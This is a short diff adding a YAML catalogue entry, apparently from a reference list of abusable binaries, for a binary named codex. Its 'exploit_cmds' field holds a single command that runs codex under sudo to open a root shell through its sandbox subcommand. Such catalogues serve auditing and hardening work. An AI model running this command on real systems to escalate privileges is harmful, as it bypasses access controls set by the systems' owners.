@@ -1,0 +1,4 @@
+name: codex
+binary_path: /usr/bin/codex
+exploit_cmds:
+- sudo /usr/bin/codex sandbox linux /bin/sh
